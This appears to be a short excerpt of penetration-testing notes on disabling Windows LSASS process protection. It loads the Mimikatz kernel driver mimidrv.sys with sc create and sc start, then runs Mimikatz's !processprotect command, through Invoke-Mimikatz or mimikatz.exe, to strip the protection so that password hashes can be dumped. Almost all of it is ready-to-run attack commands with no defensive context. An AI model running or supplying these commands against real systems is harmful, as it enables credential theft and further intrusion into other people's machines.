> Once we have an admin shell we can download mimidrv.sys and then load the driver:

```
sc create mimidrv binPath= "<path_to_file>" type= kernel start= demand
```

> Confirm it is running:

```
sc start mimidrv
```

> Download Mimikatz and execute:

```
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
```

> We can also use the exe as well:

```
.\mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "exit"
```

Once LSASS protection is disabled we can use mimikatz as normal to dump hashes.

